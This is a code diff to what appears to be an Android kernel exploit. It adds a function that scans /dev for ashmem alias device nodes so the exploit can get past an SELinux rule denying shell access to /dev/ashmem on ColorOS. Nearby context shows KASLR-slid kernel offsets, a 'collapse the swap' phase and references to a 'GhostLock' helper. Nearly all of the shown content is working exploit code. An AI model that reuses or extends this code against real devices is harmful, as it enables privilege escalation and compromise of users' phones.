@@ -82,6 +82,38 @@ static uintptr_t p0_of_phys(uint64_t phys) {
 static void put64(unsigned char *p, size_t off, uint64_t v) { memcpy(p + off, &v, 8); }
 static void put32(unsigned char *p, size_t off, uint32_t v) { memcpy(p + off, &v, 4); }
 
+/* Open the ashmem misc device via a shell-openable alias node.
+ * /dev/ashmem itself is SELinux-denied for shell (EACCES, ROM policy);
+ * ColorOS creates ashmem<uuid> aliases with the same rdev that open fine.
+ * GhostLock's find_ashmem_path does the same scan. */
+#include <dirent.h>
+#include <sys/stat.h>
+static int open_ashmem_alias(void) {
+  struct stat base;
+  if (stat("/dev/ashmem", &base) != 0) return -1;
+  DIR *d = opendir("/dev");
+  if (!d) return -1;
+  int fd = -1;
+  struct dirent *de;
+  while ((de = readdir(d)) != NULL) {
+    if (strncmp(de->d_name, "ashmem", 6) != 0 ||
+        strcmp(de->d_name, "ashmem") == 0)
+      continue;
+    char path[300];
+    snprintf(path, sizeof(path), "/dev/%s", de->d_name);
+    struct stat st;
+    if (stat(path, &st) != 0 || st.st_rdev != base.st_rdev) continue;
+    fd = open(path, O_RDWR | O_CLOEXEC);
+    if (fd >= 0) {
+      printf("  ashmem alias: %s fd=%d
+", path, fd);
+      break;
+    }
+  }
+  closedir(d);
+  return fd;
+}
+
 static int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
   char name[ASHMEM_NAME_LEN];
   memset(name, 0x41, sizeof(name));
@@ -377,7 +409,7 @@ int main(int argc, char **argv) {
   prctl(PR_SET_NAME, PROBE_COMM, 0, 0, 0);
 
   /* ============ PHASE 1: collapse the swap (fast!) ============ */
-  int fd1 = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
+  int fd1 = open_ashmem_alias();
   if (fd1 < 0) { printf("P1 open fd1 errno=%d\n", errno); return 1; }
   uint64_t llseek = slid(OFF_NOOP_LLSEEK);
   uint64_t cfg_w = slid(OFF_CFG_WRITE);
@@ -395,7 +427,7 @@ int main(int argc, char **argv) {
   if (gl_pid) kill(gl_pid, SIGKILL);
   close(fd1);
 
-  int fd2 = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
+  int fd2 = open_ashmem_alias();
   if (fd2 < 0) { printf("P1 open fd2 errno=%d\n", errno); return 1; }
   g_fd = fd2;
   uint64_t chk = 0;
